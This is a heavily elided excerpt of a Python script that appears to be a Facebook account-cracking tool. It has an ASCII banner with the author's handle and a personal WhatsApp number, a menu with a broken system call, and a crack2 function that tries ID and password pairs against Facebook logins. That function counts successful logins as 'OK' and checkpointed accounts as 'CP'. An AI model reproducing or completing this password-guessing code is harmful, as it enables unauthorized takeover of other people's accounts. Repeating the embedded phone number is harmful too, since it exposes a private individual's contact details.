...
def banner():
	...
	print("""%s\n\x1b[93;1m
     ...
     ___       __        ______   .___  ___.   _______  __  .______      
    /   \     |  |      /  __  \  |   \/   |  /  _____||  | |   _  \     
   /  ^  \    |  |     |  |  |  | |  \  /  | |  |  __  |  | |  |_)  |    
  /  /_\  \   |  |     |  |  |  | |  |\/|  | |  | |_ | |  | |      /     
 /  _____  \  |  `----.|  `--'  | |  |  |  | |  |__| | |  | |  |\  \----.
/__/     \__\ |_______| \______/  |__|  |__|  \______| |__| | _| `._____|
...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mALOMGIR-XD
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801746532370
\x1b[93;1m Facebook       \x1b[92;1m=>      \x1b[93;1mMD ALOMGIR HOSAIN
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/profile.php?id=100003562345775")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [ALOM] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [ALOM-CP] %s|%s        '%(b,idf,pw))
